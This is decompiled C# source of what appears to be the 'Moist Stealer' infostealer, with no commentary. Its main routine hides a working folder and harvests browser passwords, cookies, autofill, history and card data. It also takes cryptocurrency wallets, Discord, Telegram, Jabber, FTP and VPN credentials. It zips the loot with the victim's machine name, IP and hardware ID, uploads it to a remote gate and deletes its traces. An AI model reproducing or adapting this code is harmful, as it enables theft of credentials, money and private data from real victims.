using System;
using System.IO;
using System.Text;
using System.Threading;
using Ionic.Zip;

namespace Moist
{
	// Token: 0x02000054 RID: 84
	public static class Stealer
	{
		// Token: 0x06000235 RID: 565 RVA: 0x00011930 File Offset: 0x0000FB30
		[STAThread]
		public static void GetStealer()
		{
			try
			{
				Directory.CreateDirectory(Help.Moist_Dir);
				Directory.CreateDirectory(Help.Browsers);
				Directory.CreateDirectory(Help.Passwords);
				Directory.CreateDirectory(Help.Autofills);
				Directory.CreateDirectory(Help.Downloads);
				Directory.CreateDirectory(Help.Cookies);
				Directory.CreateDirectory(Help.History);
				Directory.CreateDirectory(Help.Cards);
				File.SetAttributes(Help.dir, FileAttributes.Hidden | FileAttributes.System | FileAttributes.Directory);
				GetFiles.Inizialize(Help.Moist_Dir);
				Thread.Sleep(new Random(Environment.TickCount).Next(10000, 20000));
				try
				{
					Class4.smethod_0(Help.Cookies);
				}
				catch
				{
				}
				try
				{
					Class4.PlqfdbrYf(Help.Passwords);
				}
				catch
				{
				}
				try
				{
					Class4.smethod_2(Help.Autofills);
				}
				catch
				{
				}
				try
				{
					Class4.smethod_3(Help.Downloads);
				}
				catch
				{
				}
				try
				{
					Class4.smethod_4(Help.History);
				}
				catch
				{
				}
				try
				{
					Class4.smethod_1(Help.Cards);
				}
				catch
				{
				}
				try
				{
					Class12.smethod_2();
				}
				catch
				{
				}
				try
				{
					Class12.smethod_3();
				}
				catch
				{
				}
				try
				{
					Class25.smethod_0(Help.Moist_Dir);
				}
				catch
				{
				}
				try
				{
					Class15.smethod_0(Help.Moist_Dir);
				}
				catch
				{
				}
				try
				{
					Class24.smethod_0(Help.Moist_Dir);
				}
				catch
				{
				}
				try
				{
					Class23.smethod_0(Help.Moist_Dir);
				}
				catch
				{
				}
				try
				{
					Class20.smethod_0(Help.Moist_Dir);
				}
				catch
				{
				}
				try
				{
					TGrabber.Start(Help.Moist_Dir);
				}
				catch
				{
				}
				try
				{
					Class14.smethod_0(Help.Moist_Dir);
				}
				catch
				{
				}
				try
				{
					Class21.smethod_0(Help.Moist_Dir);
				}
				catch
				{
				}
				try
				{
					Class13.smethod_0(Help.Moist_Dir);
				}
				catch
				{
				}
				try
				{
					Class22.smethod_0(Help.Moist_Dir);
				}
				catch
				{
				}
				try
				{
					Class16.smethod_0(Help.Moist_Dir);
				}
				catch
				{
				}
				try
				{
					Class17.smethod_0(Help.Moist_Dir);
				}
				catch
				{
				}
				try
				{
					Class37.smethod_0(Help.Moist_Dir);
				}
				catch
				{
				}
				try
				{
					DomainDetect.Start(Help.Browsers);
				}
				catch
				{
				}
				string text = string.Concat(new string[]
				{
					Help.dir,
					"\\",
					Help.HWID,
					Help.smethod_0(),
					".zip"
				});
				using (ZipFile zipFile = new ZipFile(Encoding.GetEncoding("cp866")))
				{
					zipFile.CompressionLevel = 9;
					zipFile.Comment = string.Concat(new string[]
					{
						"Moist Stealer. Build 1.1\n<---------------------------------------->\nPC:",
						Environment.MachineName,
						"/",
						Environment.UserName,
						"\nIP: ",
						Help.IP,
						Help.Country(),
						"\nHWID: ",
						Help.HWID
					});
					zipFile.AddDirectory(Help.Moist_Dir ?? "");
					zipFile.Save(text ?? "");
				}
				string text2 = text ?? "";
				byte[] file = File.ReadAllBytes(text2);
				string url = string.Concat(new string[]
				{
					Help.ApiUrl,
					"?id=",
					Class1.string_0,
					"&caption=",
					"⚡️ Moist Stealer Gate detected new log! ⚡️\n",
					"\ud83d\udd25 User: ",
					Environment.MachineName,
					"/",
					Environment.UserName,
					" \ud83d\udd25\n",
					"\ud83c\udf0d IP: " + Help.IP,
					" ",
					Help.Country(),
					"\n\n",
					string.Concat(new string[]
					{
						"\n\ud83c\udf10 Browsers Data\nPasswords: ",
						(Class4.int_0 + Class10.int_0 + Class12.EeFrnHmbxo).ToString(),
						"\nCookies: ",
						(Class4.int_3 + Class12.int_0).ToString(),
						"\nHistory: ",
						Class4.int_4.ToString(),
						"\nAutofill: ",
						Class4.int_1.ToString(),
						"\nCC:  ",
						Class4.int_5.ToString(),
						"\n"
					}),
					string.Concat(new string[]
					{
						"\n\ud83d\udcb6 Wallets: ",
						(Class37.int_0 > 0) ? "Yes" : "No",
						(Class31.int_0 > 0) ? " Electrum" : "",
						(Class26.int_0 > 0) ? " Armory" : "",
						(Class27.int_0 > 0) ? " Atomic" : "",
						(Class28.int_0 > 0) ? " BitcoinCore" : "",
						(Class29.int_0 > 0) ? " Bytecoin" : "",
						(Class30.int_0 > 0) ? " DashCore" : "",
						(Class32.int_0 > 0) ? " Ethereum" : "",
						(Class33.int_0 > 0) ? " Exodus" : "",
						(Class35.int_0 > 0) ? " LitecoinCore" : "",
						(Class36.int_0 > 0) ? " Monero" : "",
						(Class38.int_0 > 0) ? " Zcash" : "",
						(Class34.int_0 > 0) ? " Jaxx" : "",
						"\n\n\ud83e\uddf2 Grabbed files: ",
						GetFiles.count.ToString(),
						"\n\ud83d\udcac Discord: ",
						(Class14.int_0 > 0) ? "Yes" : "No",
						"\n\ud83d\udee9 Telegram: ",
						(TGrabber.count > 0) ? "Yes" : "No",
						"\n\ud83d\udca1 Jabber: ",
						(Class20.int_0 + Class18.int_0 > 0) ? "Yes" : "No",
						(Class18.int_0 > 0) ? (" Pidgin (" + Class18.uGwrzbZsuw.ToString() + ")") : "",
						(Class20.int_0 > 0) ? " Psi" : "",
						"\n\n\ud83d\udce1 FTP\nFileZilla: ",
						(Class16.int_0 > 0) ? ("Yes (" + Class16.int_0.ToString() + ")") : "No",
						"\nTotalCmd: ",
						(Class17.int_0 > 0) ? "Yes" : "No",
						"\n\n⚖️ VPN\nNordVPN: ",
						(Class23.int_0 > 0) ? "Yes" : "No",
						"\nOpenVPN: ",
						(Class24.int_0 > 0) ? "Yes" : "No",
						"\nProtonVPN: ",
						(Class25.int_0 > 0) ? "Yes" : "No",
						"\n\nHWID: ",
						Help.HWID,
						"\n⚙️ ",
						Class22.smethod_4(),
						"\n\ud83d\udd0e Domain detect",
						File.ReadAllText(Help.Browsers + "\\DomainDetect.txt")
					})
				});
				SenderAPI.POST(file, text2, "application/x-ms-dos-executable", url);
				Directory.Delete(Help.dir + "\\", true);
				File.AppendAllText(Help.LocalData + "\\" + Help.HWID, Help.HWID);
			}
			catch
			{
			}
		}
	}
}
